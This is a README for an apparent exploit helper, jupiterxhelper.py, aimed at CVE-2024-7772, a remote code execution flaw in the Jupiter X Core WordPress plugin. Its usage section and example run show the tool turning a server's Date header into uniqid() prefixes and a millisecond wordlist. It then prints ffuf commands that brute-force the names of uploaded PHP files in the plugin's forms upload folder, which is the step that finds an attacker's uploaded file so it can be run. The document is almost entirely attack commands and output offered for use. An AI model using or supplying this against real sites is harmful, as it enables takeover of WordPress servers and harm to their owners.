# Jupiter X RCE uniqid() Helper

See [Jupiter X Core Plugin <= 4.6.5 Remote Code Execution (CVE-2024-7772)](https://blog.lexfo.fr/jupiterx-rce-cve-2024-7772.html) for more information.

## Usage

```
usage: jupiterxhelper.py [-h] --server-date SERVER_DATE --wp-url WP_URL

Jupiter X RCE uniqid() Helper

optional arguments:
  -h, --help            show this help message and exit
  --server-date SERVER_DATE
                        The server date
  --wp-url WP_URL       The WordPress URL
```

## Example

```
$ ./jupiterxhelper.py --server-date "Sun, 04 Aug 2024 13:10:06 GMT" --wp-url "https://192.168.1.32/wordpress"
generating the file milliseconds.txt..
http response date is Sun, 04 Aug 2024 13:10:06 GMT
response date with delta=0 2024-08-04 13:10:06+00:00 [66af7dae]
response date with delta=-1 2024-08-04 13:10:05+00:00 [66af7dad]
response date with delta=1 2024-08-04 13:10:07+00:00 [66af7daf]

execute by priority:
URL=https://192.168.1.32/wordpress/wp-content/uploads/jupiterx/forms
ffuf -u $URL/66af7daeFUZZ.php -w milliseconds.txt -o result_66af7dae -ignore-body
ffuf -u $URL/66af7dadFUZZ.php -w milliseconds.txt -o result_66af7dad -ignore-body
ffuf -u $URL/66af7dafFUZZ.php -w milliseconds.txt -o result_66af7daf -ignore-body
```